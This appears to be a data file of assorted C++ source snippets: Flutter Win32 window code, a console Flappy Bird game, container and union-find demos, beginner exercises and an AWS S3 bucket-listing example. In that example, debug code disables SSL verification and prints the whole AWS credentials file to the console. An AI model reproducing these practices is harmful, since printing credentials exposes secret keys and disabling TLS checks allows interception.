scale_factor);\r\n}\r\n\r\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\r\n// This API is only needed for PerMonitor V1 awareness mode.\r\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\r\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\r\n  if (!user32_module) {\r\n    return;\r\n  }\r\n  auto enable_non_client_dpi_scaling =\r\n      reinterpret_cast<EnableNonClientDpiScaling*>(\r\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\r\n  if (enable_non_client_dpi_scaling != nullptr) {\r\n    enable_non_client_dpi_scaling(hwnd);\r\n  }\r\n  FreeLibrary(user32_module);\r\n}\r\n\r\n}  // namespace\r\n\r\n// Manages the Win32Window's window class registration.\r\nclass WindowClassRegistrar {\r\n public:\r\n  ~WindowClassRegistrar() = default;\r\n\r\n  // Returns the singleton registrar instance.\r\n  static WindowClassRegistrar* GetInstance() {\r\n    if (!instance_) {\r\n      instance_ = new WindowClassRegistrar();\r\n    }\r\n    return instance_;\r\n  }\r\n\r\n  // Returns the name of the window class, registering the class if it hasn't\r\n  // previously been registered.\r\n  const wchar_t* GetWindowClass();\r\n\r\n  // Unregisters the window class. Should only be called if there are no\r\n  // instances of the window.\r\n  void UnregisterWindowClass();\r\n\r\n private:\r\n  WindowClassRegistrar() = default;\r\n\r\n  static WindowClassRegistrar* instance_;\r\n\r\n  bool class_registered_ = false;\r\n};\r\n\r\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\r\n\r\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\r\n  if (!class_registered_) {\r\n    WNDCLASS window_class{};\r\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\r\n    window_class.lpszClassName = kWindowClassName;\r\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\r\n    window_class.cbClsExtra = 0;\r\n    window_class.cbWndExtra = 0;\r\n    window_class.hInstance = GetModuleHandle(nullptr);\r\n    window_class.hIcon =\r\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\r\n    window_class.hbrBackground = 0;\r\n    window_class.lpszMenuName = nullptr;\r\n    window_class.lpfnWndProc = Win32Window::WndProc;\r\n    RegisterClass(&window_class);\r\n    class_registered_ = true;\r\n  }\r\n  return kWindowClassName;\r\n}\r\n\r\nvoid WindowClassRegistrar::UnregisterWindowClass() {\r\n  UnregisterClass(kWindowClassName, nullptr);\r\n  class_registered_ = false;\r\n}\r\n\r\nWin32Window::Win32Window() {\r\n  ++g_active_window_count;\r\n}\r\n\r\nWin32Window::~Win32Window() {\r\n  --g_active_window_count;\r\n  Destroy();\r\n}\r\n\r\nbool Win32Window::Create(const std::wstring& title,\r\n                         const Point& origin,\r\n                         const Size& size) {\r\n  Destroy();\r\n\r\n  const wchar_t* window_class =\r\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\r\n\r\n  const POINT target_point = {static_cast<LONG>(origin.x),\r\n                              static_cast<LONG>(origin.y)};\r\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\r\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\r\n  double scale_factor = dpi / 96.0;\r\n\r\n  HWND window = CreateWindow(\r\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\r\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\r\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\r\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\r\n\r\n  if (!window) {\r\n    return false;\r\n  }\r\n\r\n  UpdateTheme(window);\r\n\r\n  return OnCreate();\r\n}\r\n\r\nbool Win32Window::Show() {\r\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\r\n}\r\n\r\n// static\r\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\r\n                                      UINT const message,\r\n                                      WPARAM const wparam,\r\n              ",
    "// JUST FOR AN EXAMPLE OF HOW TO USE THE HEADERFILE AND WRITE THE CODE.\n// ALL THE INFO ARE GIVEN IN README FILE PLEASE READ IT\n\n#include <iostream>\n#include \"binary_treetraversal.h\"\n\nusing namespace std;\n\nint main()\n{\n    // Build the tree interactively\n    cout << \"Building the tree:\\n\";\n    BinaryTreeTraversals *root = BinaryTreeTraversals::buildTree();\n\n    // Perform various traversals\n    cout << \"Level Order Traversal:\\n\";\n    root->levelOrderTraversal();\n\n    cout << \"Inorder Traversal: \";\n    root->inorderTraversal();\n    cout << endl;\n\n    cout << \"Preorder Traversal: \";\n    root->preorderTraversal();\n    cout << endl;\n\n    cout << \"Postorder Traversal: \";\n    root->postorderTraversal();\n    cout << endl;\n\n    cout << \"Reverse Inorder Traversal: \";\n    root->reverseInorderTraversal();\n    cout << endl;\n\n    cout << \"Reverse Preorder Traversal: \";\n    root->reversePreorderTraversal();\n    cout << endl;\n\n    cout << \"Reverse Postorder Traversal: \";\n    root->reversePostorderTraversal();\n    cout << endl;\n\n    delete root; // Clean up allocated memory\n    return 0;\n}",
    "#include <iostream>  \r\n#include <conio.h>    \r\n#include <windows.h> \r\n#include<stdio.h> // Include standard input and output library\r\n                  \r\n#define sw 110\r\n#define sh 30\r\n#define ww 80\r\n#define gapsize 7      \r\n#define pdiff 35\r\n#define pw 3\r\n\r\n\r\nusing namespace std;\r\n\r\n                    \r\nHANDLE window = GetStdHandle(STD_OUTPUT_HANDLE);\r\nCOORD cpos;\r\n\t\r\n             \r\n\t\t\r\nvoid gotopos(int x, int y);\r\n\r\nstruct playerinfo{\r\n\tchar name[20]; // Player name\r\n\tint score; // Player score\r\n\tchar month[5]; // Month of play\r\n\tint day; // Day of play\r\n\tint year; // Year of play\r\n};\r\nstruct playerinfo player; // Current player\r\nstruct playerinfo players[1000]; // All players\r\n\r\n\r\nclass bird {\r\npublic:\r\n    char body[2][6];\r\n    float pos;\r\n    float speed;\r\n    int score;\r\n    int t;\r\n\r\n\r\n    bird() {\r\n    \t\t\tpos=12; speed=0;score=0;t=75;\r\n\t\t\t\tbody[0][0] = '|'; body[0][1] = '-'; body[0][2] = '-'; body[0][3] = 'o'; body[0][4] = '\\\\'; body[0][5] = ' ';\r\n    \t\t\tbody[1][0] = '|'; body[1][1] = '_' ; body[1][2] = '_' ; body[1][3] = '_' ; body[1][4] = ' ' ; body[1][5] = '>';\r\n    }\r\n\r\n    void draw() {\r\n    \t\r\n    \tif(pos>=0 && pos<=30){\r\n\t\t\r\n        for (int i = 0; i < 2; i++) {\r\n            for (int j = 0; j < 6; j++) {\r\n                gotopos(j + 2, i + pos); cout << body[i][j];\r\n            }\r\n        }\r\n    }}\r\n\r\n\tvoid stats(){\r\n\t\t\r\n\tfor(int i=0;i<=14;i++){gotopos(ww-7+((sw-ww)/2)+i,sh/2-11);cout<<\"-\";}\r\n\tgotopos(ww-5+((sw-ww)/2),sh/2-10);cout<<\"Flappy Bird\";\r\n\tfor(int i=0;i<=14;i++){gotopos(ww-7+((sw-ww)/2)+i,sh/2-9);cout<<\"-\";}\r\n\t\r\n\tgotopos(ww-3+((sw-ww)/2),sh/2);cout<<\"Score=\"<<score;\r\n\tfor(int i=0;i<=9;i++){gotopos(ww-4+((sw-ww)/2)+i,sh/2+1);cout<<\"-\";}\r\n\t\r\n\tgotopos(ww-13+((sw-ww)/2),sh/2+8);cout<<\"--Instructions:\";\r\n\tgotopos(ww-13+((sw-ww)/2),sh/2+9);cout<<\"-->Press 'Space' to Make\";\r\n\tgotopos(ww-13+((sw-ww)/2),sh/2+10);cout<<\"   Your Bird Fly\";\r\n\t\t\r\n\t}\r\n    void erase() {\r\n    \t\r\n    \tif(pos>=0 && pos<=30){\r\n        for (int i = 0; i < 2; i++) {\r\n            for (int j = 0; j < 6; j++) {\r\n                gotopos(j + 2, i + pos); cout << \" \";\r\n            }\r\n        }\r\n    }}\r\n\r\n\r\n};\r\n\r\nclass pipe{\r\n\tpublic:\r\n\t\tint pos;\r\n\t\tint gap;\r\n\t\t\r\n\r\n\t\t\r\n\t\t\r\n\t\t\t\tpipe(){\r\n\r\n\t\t\t\tpos=50;\r\n\r\n\t\t\tgappos();\r\n\t\t}\r\n\t\t\r\n\t\t\r\n\t\tpipe(int &p){\r\n\r\n\t\t\t\tpos=p+pdiff;\r\n\t\t\tgappos();\r\n\t\t}\r\n\t\r\n\t\tvoid gappos(){\r\n\t\t\tgap=3+rand() % 20;\r\n\t\t\t\r\n\t\t\t\r\n\t\t}\r\n\t\t\r\n\t\tvoid moveleft(){\r\n\t\t\tpos--;\r\n\t\t}\r\n\t\t\r\n\t\tvoid draw(){\r\n\t\t\t\r\n         if(pos<(ww-pw)){\r\n         \t\tfor(int i=0;i<gap;i++){\r\n\t\t\t\tgotopos(pos,i+1);cout<<\"***\";\r\n\t\t\t}\r\n\t\t\t\r\n\t\t\tfor(int i=gap+gapsize;i<sh;i++){\r\n\t\t\t\t\r\n\t\t\t\tgotopos(pos,i);cout<<\"***\";\r\n\t\t\t}\r\n\t\t }\r\n\t\t\t\r\n\t\t}\r\n\t\t\r\n\t\tvoid erase(){\r\n\t\t\tif(pos<(ww-pw)){\r\n\t\t\t\t\tfor(int i=0;i<gap;i++){\r\n\t\t\t\tgotopos(pos,i+1);cout<<\"   \";\r\n\t\t\t}\r\n\t\t\t\r\n\t\t\tfor(int i=gap+gapsize;i<sh;i++){\r\n\t\t\t\t\r\n\t\t\t\tgotopos(pos,i);cout<<\"   \";\r\n\t\t\t}\r\n\t\t\t\r\n\t\t\t\r\n\t\t\t\r\n\t\t}}\r\n\t\r\n};\r\n\r\n\r\nvoid gameover(bird &b);\r\nvoid game();\r\nint play();\r\n\r\nvoid gotopos(int x, int y){\r\n\tcpos.X=x;\r\n\tcpos.Y=y;\r\n\tSetConsoleCursorPosition(window,cpos);\r\n}\r\n\r\n\r\nvoid border(){\r\n\t\r\n\tfor(int i=1; i<sw; i++){\r\n\t\t\r\n\t\tgotopos(i,0); cout<<\"-\";\r\n\t\tgotopos(i,sh); cout<<\"_\";\r\n\t}\r\n\t\r\n\tfor(int i=1;i<sh;i++){\r\n\t\tgotopos(0,i);cout<<\"|\";\t\r\n\t\tgotopos(sw,i);cout<<\"|\";\r\n\t}\r\n\t\r\n\t\tfor (int i = 1; i < sh; i++) {\r\n        gotopos(ww, i); cout << \"|\";\r\n    }\r\n\r\n\t\r\n}\r\n\r\npipe rank(pipe &p1, pipe &p2, pipe &p3){\r\n\tif(p1.pos<p2.pos && p1.pos<p3.pos){\r\n\t\treturn p1;\r\n\t}\r\n\t\r\n\t\telse if(p2.pos<p1.pos && p2.pos<p3.pos){\r\n\t\treturn p2;\r\n\t}\r\n\t\r\n\t\t\telse if(p3.pos<p1.pos && p3.pos<p2.pos){\r\n\t\treturn p3;\r\n\t}\r\n}\r\n\r\n\r\nbool check(bird &b, pipe &p1, pipe &p2, pipe &p3){\r\n\t\r\n\tif(b.pos>29 || b.pos<1){\r\n\t\treturn 1;\r\n\t} \r\n\r\n\tpipe first;\r\n\tfirst=rank(p1,p2,p3);\r\n\t\r\nif(p1.pos<8 ||p2.pos<8||p3.pos<8){\r\n\tif(b.pos>=first.gap+1 && b.pos<=first.gap+gapsize-2){\r\n\t\treturn 0;\r\n\t}\r\n\telse {\r\n\t\treturn 1;\r\n\t}\r\n\t\r\n\t\r\n}\r\n\r\n\treturn 0;\r\n}\r\n\r\n\r\nint leaderboard(){\r\nchar tempname[20]; // Temporary player name\r\nchar tempmonth[5]; // Temporary month\r\nint tempday; // Temporary day\r\nint tempyear; // Temporary year\r\nint tempscore; // Temporary score\r\nint key;\r\n\tFILE *file = fopen(\"leaderboard.txt\", \"r\"); // Open leaderboard file\r\n\tif (file == NULL) {\r\n\t\tprintf(\"Error opening file.\\n\");\r\n\t\treturn 0;\r\n\t}\r\n\tint p=0;\r\n\twhile(fscanf(file, \"%s %d %d %s %d\", &players[p].month, &players[p].day, &players[p].year, &players[p].name, &players[p].score) != EOF){ // Read player data\r\n\t\tp++;\r\n\t}\r\n\tfor(int j=0;j<=p;j++){\r\n\t\tfor(int k=j+1;k<=p;k++){\r\n\t\t\tif(players[j].score<players[k].score){ // If next player has higher score\r\n\t\t\t\t// Swap player data\r\n\t\t\t\tstrcpy(tempname,players[j].name);\r\n\t\t\t\tstrcpy(tempmonth,players[j].month);\r\n\t\t\t\ttempscore=players[j].score; // Temporary score\r\n\t\t\t\ttempday=players[j].day; // Temporary day\r\n\t\t\t\ttempyear=players[j].year; // Temporary year\r\n\t\t\t\tstrcpy(players[j].name,players[k].name); // Swap player names\r\n\t\t\t\tstrcpy(players[j].month,players[k].month); // Swap player months\r\n\t\t\t\tplayers[j].score=players[k].score; // Swap player scores\r\n\t\t\t\tplayers[j].da",
    "#include \"simplevector.h\"\n#include <iostream>\n#include <string>\n\nusing std::cin;\nusing std::string;\nusing std::cout;\nusing std::endl;\n\n\n// \uac1d\uccb4 \uc815\ubcf4 \ucd9c\ub825 \ud568\uc218 \uc774\uac83 \ub54c\ubb38\uc5d0 \uc5f0\uc0b0\uc790[] \uc624\ubc84\ub85c\ub529.\n// size(), capacity() \uc791\ub3d9 \ud655\uc778\ub3c4 \uac00\ub2a5\ntemplate <typename T>\nvoid printinfo(SimpleVector<T>& obj) {\n\tcout << \"size : \" << obj.size() << endl\n\t\t<< \"capacity : \" << obj.capacity() << endl;\n\tfor (int i = 0; i < obj.size() ; i++)  {\n\t\tcout << obj[i] << \" \";\n\t}\n}\n\nvoid seperateline() {\n\tcout << endl;\n\tfor (int i = 0; i < 30; i++) {\n\t\tcout << '-';\n\t}\n\tcout << endl;\n}\n\nint main() {\n\n\tcout << \"\uae30\ubcf8, \ub9e4\uac1c\ubcc0\uc218 \uc0dd\uc131\uc790 \uc791\ub3d9 \ud655\uc778\" << endl;\n\tSimpleVector<int> vec1; // \uae30\ubcf8 \uc0dd\uc131\uc790 \ud638\ucd9c\n\tcout << \"capacity of vec1 : \" << vec1.capacity() << endl; // \uc6a9\ub7c9 \ud655\uc778\n\tSimpleVector<int> vec2(20); // \ub9e4\uac1c\ubcc0\uc218 \uc0dd\uc131\uc790 \ud638\ucd9c\n\tcout << \"capacity of vec1 : \" << vec2.capacity() << endl; // \uc6a9\ub7c9 \ud655\uc778\n\n\tseperateline();\n\n\tcout << \"\uc774\ub2c8\uc15c\ub77c\uc774\uc800, \ubcf5\uc0ac \uc0dd\uc131\uc790 \uc791\ub3d9 \ud655\uc778\" << endl;\n\tSimpleVector<int> vec3 = { 5, 4, 2, 6, 7 ,9 ,1 ,3 ,8 ,10 }; // \uc774\ub2c8\uc15c\ub77c\uc774\uc800 \uc0dd\uc131\uc790 \ud638\ucd9c\n\tSimpleVector<int> vec4 = vec3;  // \ubcf5\uc0ac \uc0dd\uc131\uc790 \ud638\ucd9c;\n\tprintinfo(vec4);\n\n\tseperateline();\n\n\tcout << \"push_back \ub3d9\uc791 \ud655\uc778\" << endl;\n\tvec1.push_back(10);\t\t\t// push_back\n\tvec1.push_back(20);\n\tvec1.push_back(30);\n\tvec1.push_back(40);\n\tprintinfo(vec1);\n\n\tseperateline();\n\t\n\tcout << \"push_back \ubc30\uc5f4\ud06c\uae30 \uc99d\uac00 \ud655\uc778\" << endl;\n\tvec3.push_back(11);\t\t\t// push_back \ubc30\uc5f4 \ud06c\uae30 5\uc99d\uac00\n\tprintinfo(vec3);\n\n\tseperateline();\n\n\tcout << \"pop_back \ub3d9\uc791 \ud655\uc778\" << endl;\n\tvec1.pop_back();\t\t\t// pop_back\n\tvec1.pop_back();\n\tprintinfo(vec1);\n\n\tseperateline();\n\n\tcout << \"\uc815\ub82c \ud655\uc778(\uc624\ub984\ucc28\uc21c)\" << endl;\n\tvec3.sortData();\t\t\t\n\tprintinfo(vec3);\n\n\tseperateline();\n\n\tcout << \"\uc815\ub82c \ud655\uc778(\ub0b4\ub9bc\ucc28\uc21c)\" << endl;\n\tvec3.sortDescending();\n\tprintinfo(vec3);\n\t\n\tseperateline();\n\n\t// \uc5ec\ub7ec\uac00\uc9c0 \uc790\ub8cc\ud615 \ud655\uc778\n\tSimpleVector<float> vecfloat = { 1.0, 12.4, 43.23, 12.8, 7.3 };\n\tprintinfo(vecfloat);\n\tseperateline();\n\tSimpleVector<string> vecstring = { \"\uc548\ub155\", \"\ud558\uc138\uc694,\", \"Hello\", \"World\"};\n\tprintinfo(vecstring);\n\tseperateline();\n\n\treturn 0;\n}",
    "// Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved.\n// SPDX-License-Identifier: Apache-2.0\n\n#include <aws/core/Aws.h>\n#include <aws/core/auth/AWSCredentials.h>\n#include <aws/core/auth/AWSCredentialsProvider.h>\n#include <aws/s3/S3Client.h>\n#include <aws/s3/model/Bucket.h>\n\n#include <fstream>\n#include <iostream>\n\n#include \"s3_examples.h\"\n\n/**\n * Before running this C++ code example, set up your development environment, including your credentials.\n *\n * For more information, see the following documentation topic:\n *\n * https://docs.aws.amazon.com/sdk-for-cpp/v1/developer-guide/getting-started.html\n *\n * Purpose\n *\n * Demonstrates using the AWS SDK for C++ to list the buckets in the current account.\n *\n */\n\n//! Routine which demonstrates listing the buckets in the current account.\n/*!\n  \\param clientConfig: Aws client configuration.\n  \\return bool: Function succeeded.\n*/\n\n// snippet-start:[s3.cpp.list_buckets.code]\nbool AwsDoc::S3::listBuckets(const Aws::S3::S3ClientConfiguration& clientConfig) {\n  Aws::S3::S3Client client(clientConfig);\n\n  auto outcome = client.ListBuckets();\n\n  bool result = true;\n  if (!outcome.IsSuccess()) {\n    std::cerr << \"Failed with error: \" << outcome.GetError() << std::endl;\n    result = false;\n  } else {\n    std::cout << \"Found \" << outcome.GetResult().GetBuckets().size() << \" buckets\\n\";\n    for (auto&& b : outcome.GetResult().GetBuckets()) {\n      std::cout << b.GetName() << std::endl;\n    }\n  }\n\n  return result;\n}\n// snippet-end:[s3.cpp.list_buckets.code]\n\n/*\n *\n *  main function\n *\n */\n\nint main() {\n  // The Aws::SDKOptions struct contains SDK configuration options.\n  // An instance of Aws::SDKOptions is passed to the Aws::InitAPI and\n  // Aws::ShutdownAPI methods. The same instance should be sent to both methods.\n  Aws::SDKOptions options;\n\n  // The AWS SDK for C++ must be initialized by calling Aws::InitAPI.\n  InitAPI(options);\n\n  {\n    Aws::S3::S3ClientConfiguration clientConfig;\n    // Set credentials path\n    const char* credentialsPath = std::getenv(\"AWS_SHARED_CREDENTIALS_FILE\");\n    const char* configPath = std::getenv(\"AWS_CONFIG_FILE\");\n\n    // Debug logging\n    std::cout << \"AWS_SHARED_CREDENTIALS_FILE: \" << (credentialsPath ? credentialsPath : \"not set\") << std::endl;\n    std::cout << \"AWS_CONFIG_FILE: \" << (configPath ? configPath : \"not set\") << std::endl;\n\n    if (credentialsPath != nullptr) {\n      clientConfig.profileName = \"default\";  // Use the default profile from credentials file\n      std::cout << \"Using profile: \" << clientConfig.profileName << std::endl;\n    } else {\n      std::cout << \"No credentials path found!\" << std::endl;\n    }\n\n    // Add timeouts to prevent hanging\n    clientConfig.connectTimeoutMs = 5000;   // 5 seconds connection timeout\n    clientConfig.requestTimeoutMs = 10000;  // 10 seconds request timeout\n\n    // SSL Configuration\n    // TODO: Figure out why we get CURL 60 errors using SSL\n    clientConfig.verifySSL = false;\n\n    // After checking credentials file, add config file check\n    if (configPath != nullptr) {\n      std::cout << \"Checking if config file exists...\" << std::endl;\n      std::ifstream configFile(configPath);\n      if (configFile.good()) {\n        std::cout << \"Config file found and readable.\" << std::endl;\n        std::string line;\n        while (std::getline(configFile, line)) {\n          if (line.find(\"region\") != std::string::npos) {\n            size_t pos = line.find(\"=\");\n            if (pos != std::string::npos) {\n              clientConfig.region = Aws::String(line.substr(pos + 1));\n              // Trim whitespace\n              clientConfig.region = Aws::Utils::StringUtils::Trim(clientConfig.region.c_str());\n              std::cout << \"Using region from config: \" << clientConfig.region << std::endl;\n            }\n          }\n        }\n        configFile.close();\n      } else {\n        std::cout << \"Cannot open config file at: \" << configPath << std::endl;\n      }\n    }\n\n    std::cout << \"Creating S3 client...\" << std::endl;\n    Aws::S3::S3Client client(clientConfig);\n\n    // Verify credentials are loaded\n    auto credentialsProvider = Aws::MakeShared<Aws::Auth::ProfileConfigFileAWSCredentialsProvider>(\n        \"CredentialsProvider\", \"default\");  // Pass \"default\" as const char* directly\n\n    if (credentialsProvider) {\n      std::cout << \"Checking if credentials file exists...\" << std::endl;\n      std::ifstream credsFile(credentialsPath);\n      if (!credsFile.good()) {\n        std::cout << \"Cannot open credentials file at: \" << credentialsPath << std::endl;\n        // Try the default location\n        std::ifstream defaultCredsFile(\"/root/.aws/credentials\");\n        if (defaultCredsFile.good()) {\n          std::cout << \"Found credentials at default location /root/.aws/credentials\" << std::endl;\n          std::string line;\n          while (std::getline(defaultCredsFile, line)) {\n            std::cout << \"Content: \" << line << std::endl;\n          }\n          defaultCredsFile.close();\n        } el",
    "#include <iostream>\n#include <map>\n#include <vector>\n#include <string>\nusing namespace std;\nclass Node\n{\npublic:\n    Node *Root;\n    int index;\n    int tree_length;\n    Node(Node *Root, int index, int tree_length)\n    {\n        this->Root = Root;\n        this->index = index;\n        this->tree_length = tree_length;\n    }\n};\n\nclass Union\n{\nprivate:\n    map<string, Node *> HashMap;\n    vector<int> mapped_num;\n    int key_value;\n\npublic:\n    Union()\n    {\n        key_value = 0;\n    };\n    int mapping(string a)\n    {\n        if (HashMap.count(a) <= 0)\n        {\n            Node *new_data;\n            new_data = new Node(nullptr, key_value, 1);\n            new_data->Root = new_data;\n            HashMap.insert({a, new_data});\n            cout << \"Root    \";\n            cout << new_data->Root;\n            cout << \"    \";\n            cout << new_data;\n            cout << \"     \";\n            cout << a << \" \" << to_string(HashMap[a]->index) << endl;\n            return key_value;\n        }\n        else\n        {\n            return -1;\n        }\n    }\n    void insert(string a)\n    {\n        int value = mapping(a);\n        if (value >= 0)\n        {\n            mapped_num.push_back(value);\n            key_value++;\n        }\n    }\n    template <typename T>\n    void print(T x)\n    {\n        cout << x << endl;\n    }\n    template <typename T>\n    void print(vector<T> x)\n    {\n        cout << \"[ \";\n        for (int i = 0; i < x.size(); ++i)\n        {\n            cout << x[i];\n            cout << \" , \";\n        }\n\n        cout << \"]\" << endl;\n    }\n    void join(string a, string b)\n    {\n        if (HashMap.count(a) <= 0)\n        {\n\n            insert(a);\n        }\n        if (HashMap.count(b) <= 0)\n        {\n            insert(b);\n        }\n        Node *test_node_1;\n        Node *test_node_2;\n        int root_index;\n        test_node_1 = HashMap[a];\n        test_node_2 = HashMap[b];\n        print<string>(a + \" index is \" + to_string(test_node_1->index) + \" with Root of \");\n        cout << mapped_num[test_node_1->index] << endl;\n        print<string>(b + \" index is \" + to_string(test_node_2->index) + \" with Root of \");\n        cout << mapped_num[test_node_2->index] << endl;\n        test_node_1 = find_root(test_node_1);\n        test_node_2 = find_root(test_node_2);\n        print<int>(mapped_num);\n        int tree_length = 0;\n        if (test_node_1 != test_node_2)\n        {\n            print<string>(\"Tree length\");\n            print<int>(test_node_1->tree_length);\n            print<int>(test_node_2->tree_length);\n            if (test_node_1->tree_length >= test_node_2->tree_length)\n            {\n                test_node_2->Root = test_node_1;\n                for (vector<int>::iterator i = mapped_num.begin(); i != mapped_num.end(); i++)\n                {\n                    if (*i == test_node_2->index)\n                    {\n                        *i = test_node_1->index;\n                        tree_length++;\n                    }\n                }\n                test_node_1->tree_length += tree_length;\n                test_node_2->tree_length = test_node_1->tree_length;\n            }\n            else\n            {\n                test_node_1->Root = test_node_2;\n                for (vector<int>::iterator i = mapped_num.begin(); i != mapped_num.end(); i++)\n                {\n                    if (*i == test_node_1->index)\n                    {\n                        *i = test_node_2->index;\n\n                        tree_length++;\n                    }\n                }\n                test_node_2->tree_length += tree_length;\n                test_node_1->tree_length = test_node_2->tree_length;\n            }\n            print<int>(mapped_num);\n        }\n    }\n    Node *find_root(Node *test_node)\n    {\n        if (test_node->Root == test_node)\n        {\n            return test_node;\n        }\n        test_node->Root = find_root(test_node->Root);\n        return test_node->Root;\n    }\n    string find(string a)\n    {\n\n        cout << \"check here\" << endl;\n\n        // Node *test = new Node(HashMap[a]->Root, HashMap[a]->index, HashMap[a]->tree_length);\n\n        for (auto &it : HashMap)\n        {\n            if (mapped_num[HashMap[a]->index] == it.second->index)\n            {\n                return it.first;\n            }\n        }\n        return \"Not found\";\n    }\n};\n\nint main(int argc, char const *argv[])\n{\n    Union uf; // Create an instance of your Union class\n\n    // ------------------\n    // 1. Insert multiple items (all 26)\n    // ------------------\n    uf.insert(\"Alice\");\n    uf.insert(\"Bob\");\n    uf.insert(\"Charlie\");\n    uf.insert(\"Delta\");\n    uf.insert(\"Echo\");\n    uf.insert(\"Foxtrot\");\n    uf.insert(\"Golf\");\n    uf.insert(\"Hotel\");\n    uf.insert(\"India\");\n    uf.insert(\"Juliet\");\n    uf.insert(\"Kilo\");\n    uf.insert(\"Lima\");\n    uf.insert(\"Mike\");\n    uf.insert(\"November\");\n    uf.insert(\"Oscar\");\n    uf.insert(\"Papa\");\n    uf.insert(\"Quebec\");\n    uf.insert(\"Romeo\");\n    uf.insert(\"Sierra\");\n    uf.insert(\"Tango\");\n",
    "#include <iostream>\nusing namespace std;\n\n// int main(){\n//     std::cout << \"Hello, World!\" << std::endl; // Hello, World!\n// }\n\n\n// int main(){\n//     int x;\n//     cout << \"Enter value of x: \"; // Enter value of x:\n//     cin >> x;\n//     cout << \"Value of x is: \" << x << endl; // Value of x is: 10\n// }\n\n// int main() {\n//     int a, b;\n//     cout << \"Enter two numbers: \"; // Enter two numbers: 10 20\n//     cin >> a >> b;\n//     cout << \"Sum: \" << a + b << endl; // Sum: 30\n//     return 0;\n// }\n\n// *************************************************************************************************\n\n// if_else\n\n// int main(){\n//     int x=10;\n//     if(x>5){\n//         cout << \"x is greater than 5\" << endl; // x is greater than 5\n//     }else{\n//         cout << \"x is less than or equal to 5\" << endl;\n//     }\n// }\n\n// int main(){\n//     int x;\n//     cout << \"Enter value of x: \";\n//     cin >> x;\n//     if(x>5){\n//         cout << \"x is greater than 5\" << endl; // x is greater than 5\n//     }else if(x<5){\n//         cout << \"x is less than 5\" << endl;\n//     }else{\n//         cout << \"x is equal to 5\" << endl;\n//     }\n// }\n\n// int main(){\n//     int marks;\n//     cout << \"Enter marks: \";\n//     cin >> marks;\n\n//     if(marks>=80 && marks<=100){\n//         cout << \"Grade A\" << endl;\n//     }else if(marks>=60 && marks<=79){\n//         cout << \"Grade B\" << endl;\n//     }else if(marks>=40 && marks<=59){\n//         cout << \"Grade C\" << endl;\n//     }else if(marks>=20 && marks<=39){\n//         cout << \"Grade D\" << endl;\n//     }else{\n//         cout << \"Grade F\" << endl;\n//     }\n// }\n\n// *************************************************************************************************\n\n// Switch Case\n\n// int main(){\n//     int choice;\n//     cout << \"Enter choice(1-4): \";\n//     cin >> choice;\n\n//     switch (choice)\n//     {\n//     case 1:\n//         cout << \"You chose 1\" << endl;\n//         break;\n    \n//     case 2:\n//         cout << \"You chose 2\" << endl;\n//         break;\n    \n//     case 3:\n//         cout << \"You chose 3\" << endl;\n//         break;\n    \n//     case 4:\n//         cout << \"You chose 4\" << endl;\n//         break;\n\n//     default:\n//         cout << \"Invalid choice\" << endl;\n//         break;\n//     }\n// }\n\n// int main(){\n//     int day;\n//     cout << \"Enter day number(1-7): \";\n//     cin >> day;\n\n//     switch (day)\n//     {\n//     case 1:\n//         cout << \"Monday\" << endl;\n//         break;\n//     case 2:\n//         cout << \"Tuesday\" << endl;\n//         break;\n//     case 3:\n//         cout << \"Wednesday\" << endl;\n//         break;\n//     case 4:\n//         cout << \"Thursday\" << endl;\n//         break;\n//     case 5:\n//         cout << \"Friday\" << endl;\n//         break;\n//     case 6:\n//         cout << \"Saturday\" << endl;\n//         break;\n//     case 7:\n//         cout << \"Sunday\" << endl;\n//         break;\n//     default:\n//         cout << \"Invalid day\" << endl;\n//         break;\n//     }\n// }\n\n// *************************************************************************************************\n\n// Arrays\n\n// 1D Array\n\n// int main(){\n//     int arr[5];\n//     cout << \"Enter 5 numbers to store in an array: \";\n//     cin >> arr[0] >> arr[1] >> arr[2] >> arr[3] >> arr[4];\n//     cout << \"Entered numbers are: \";\n//     cout << arr[0] << \" \" << arr[1] << \" \" << arr[2] << \" \" << arr[3] << \" \" << arr[4] << endl;\n//     cout << \"Array at index 0: \" << arr[0] << endl;\n//     cout << \"Array at index 1: \" << arr[1] << endl;\n//     cout << \"Array at index 2: \" << arr[2] << endl;\n//     cout << \"Array at index 3: \" << arr[3] << endl;\n//     cout << \"Array at index 4: \" << arr[4] << endl;\n//     return 0;\n// }\n\n// 2D Array\n\n// int main(){\n//     int arr[3][4];\n\n//     arr[3][4] = 74;\n//     cout << arr[3][4];\n//     return 0;\n// }\n\n",
